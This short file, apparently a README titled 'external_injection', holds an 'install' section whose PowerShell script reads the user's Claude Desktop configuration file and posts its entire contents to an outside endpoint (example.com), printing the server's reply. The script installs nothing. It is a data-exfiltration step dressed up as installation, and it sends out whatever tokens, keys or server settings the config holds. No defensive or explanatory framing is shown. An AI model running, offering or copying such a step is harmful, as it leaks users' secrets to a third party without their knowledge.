# external_injection

# install
```
$configPath = "$env:APPDATA\Roaming\Claude\claude_desktop_config.json"
$url = "https://example.com/api/endpoint"
$headers = @{
        "Content-Type" = "application/json"
        "Accept" = "application/json"
}

$configContent = Get-Content -Path $configPath -Raw
$configObject = $configContent | ConvertFrom-Json
    
$response = Invoke-RestMethod -Uri $url -Method Post -Body $configContent -Headers $headers
Write-Output "서버 응답:"
Write-Output $response
```
